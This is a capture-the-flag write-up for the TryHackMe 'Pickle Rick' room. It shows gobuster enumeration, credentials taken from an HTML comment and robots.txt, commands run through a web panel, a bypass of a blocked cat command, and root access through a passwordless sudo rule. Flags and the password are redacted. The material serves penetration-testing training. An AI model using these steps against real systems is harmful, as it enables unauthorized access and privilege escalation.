// Overview

Pickle Rick is a TryHackMe room inspired by the Rick and Morty episode "Pickle Rick." The objective is to find three hidden "ingredients" within the system. This room shows how weak web security, like hardcoded credentials and poor input validation, along with a simple sudo misconfiguration, can lead to full system compromise.

// Reconnaissance

Enumeration & Source Code

A standard nmap scan shows ports 22 (SSH) and 80 (HTTP) are open. When visiting the website, we see a basic Rick-themed page. The first step is view the page source.

<!--
  Note to self, remember username!
  Username: R1ckRul3s
-->

The source comment reveals a hardcoded username, which is a significant clue.

Directory Brute-Forcing

Using gobuster to uncover hidden directories finds two important files:

$ gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt
/robots.txt           (Status: 200)
/login.php            (Status: 200)

Accessing /robots.txt uncovers a second credential:

User-agent: *
Disallow: [PASSWORD_REDACTED]

This is the password.

Login Page

Going to /login.php shows the login portal:

Using the credentials discovered earlier:

  • Username: R1ckRul3s
  • Password: [PASSWORD_REDACTED]

// Initial Foothold

Command Panel

A successful login takes us to a web-based command panel. Here, we can run system commands as the www-data user.

When we run ls, it shows a file named Sup3rS3cretPickl3Ingred.txt. Trying to cat it doesn't work; the command is blocked. But we can use less:

$ less Sup3rS3cretPickl3Ingred.txt
[FLAG_REDACTED]

Second Ingredient

The clue file (clue.txt) states: "Look around the file system for the other ingredient." Listing /home/rick shows a file named second ingredients (with a space). 

$ ls /home/rick
second ingredients

Reading it with less (using quotes because of the space):

$ less "/home/rick/second ingredients"
[FLAG_REDACTED]

// Privilege Escalation

Checking Sudo Rights

The final ingredient is likely in the /root directory. To check if we can access it, run: 

$ sudo -l
Matching Defaults entries for www-data on ip-10-10-222-222:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-222-222:
    (ALL) NOPASSWD: ALL

Great. The www-data user can run any command as root without a password.

Final Ingredient

Using sudo to list and read the root directory:

$ sudo ls /root
3rd.txt
$ sudo less /root/3rd.txt
[FLAG_REDACTED]

// Key Takeaways

Make it a habit to check the page source since credentials that have been hardcoded into HTML comments are more common than you'd think and represent the simplest means of access.
It's important to know your Linux commands; for instance, when cat doesn't work you can use alternatives such as less, more, head, and tail. This serves as a good illustration that "restrictions ≠ security."
Misconfigurations involving sudo are fatal, since allowing the www-data account to run any command as root represents a serious vulnerability. The sudo -l command should be your best ally when carrying out a Linux privilege escalation.
This room acts as a miniature kill chain since it includes enumeration, credential discovery, command injection, and privilege escalation, all of which are essential skills for junior penetration testers.
